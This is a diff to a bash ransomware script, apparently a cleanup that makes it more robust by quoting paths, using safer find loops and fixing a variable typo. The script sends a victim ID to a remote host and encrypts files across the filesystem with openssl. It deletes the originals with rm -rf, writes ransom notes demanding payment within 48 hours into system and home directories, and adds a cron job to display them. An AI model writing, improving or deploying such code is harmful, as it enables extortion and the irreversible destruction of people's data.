@@ -1,6 +1,6 @@
 #!/bin/bash
 
-genKey=$(cat /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)
+genKey=$(< /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)
 
 curl -d "uniqueID=${genKey}" http://192.168.1.132/target.php &>/dev/null
 
@@ -68,30 +68,30 @@ chmod 755 /root/key.bin
 
 for ((num=0; num<"${#fileExts[@]}"; num++))
 do
-  for file in $(find / -name "${fileExts[${num}]}")
-  do 
+  while IFS= read -r -d '' file
+  do
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
 
-    rm -rf  ${file} &>/dev/null
-  done
+    rm -rf  "${file}" &>/dev/null
+  done < <(find / -name "${fileExts[${num}]}")
 done
 
 for ((num=0; num<"${#fileList[@]}"; num++))
 do
-  for file in "${fileList[${num}]}"
+  for file in ${fileList[${num}]}
   do
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
 
-    rm -rf ${file} &>/dev/null
+    rm -rf "${file}" &>/dev/null
   done
 done
 
-for directory in $(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
+while IFS= read -r -d '' directory
 do
   {
     echo "Your files have been encrypted using AES 256-bit encryption. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
   } >> "${directory}/INSTRUCTIONS.txt"
-done
+done < <(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
 
 {
   echo -en  "#"'!'"/bin/bash"
@@ -105,7 +105,7 @@ getTTY=$(tty)
 
 if [ "${osType}" == "redhat" ]
 then
-  /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/instructions.sh > ${getTTy}"; } | /usr/bin/crontab - &>/dev/null
+  /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/instructions.sh > ${getTTY}"; } | /usr/bin/crontab - &>/dev/null
 elif [ "${osType}" == "debian" ]
 then
   /usr/bin/crontab -l | { cat; echo "*/1 * * * * /etc/cron.hourly/instructions.sh > ${getTTY}"; } | /usr/bin/crontab - &>/dev/null
